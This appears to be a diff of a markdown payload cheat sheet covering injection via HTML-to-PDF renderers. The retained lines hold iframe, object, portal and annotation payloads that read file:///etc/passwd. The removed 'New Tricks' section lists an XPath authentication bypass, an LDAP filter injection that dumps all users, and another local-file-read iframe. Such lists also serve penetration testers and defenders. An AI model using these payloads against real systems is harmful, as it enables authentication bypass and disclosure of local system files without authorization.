@@ -195,7 +195,6 @@ Code: html
 <iframe src="file:///etc/passwd" width="800" height="500"></iframe>
 <object data="file:///etc/passwd" width="800" height="500">
 <portal src="file:///etc/passwd" width="800" height="500">
-
 <annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="LFI" />
 ```
 
@@ -221,16 +220,3 @@ base64 encoded
 </script>
 ```
 
-## New Tricks
-
-### Trick 1
-- Scenario: XPath auth bypassed with boolean expression in username field.
-- Payload: `' or '1'='1`
-
-### Trick 2
-- Scenario: LDAP filter injection returned all users from directory.
-- Payload: `*)(uid=*))(|(uid=*`
-
-### Trick 3
-- Scenario: PDF renderer fetched local file during HTML-to-PDF conversion.
-- Payload: `<iframe src="file:///etc/passwd"></iframe>`
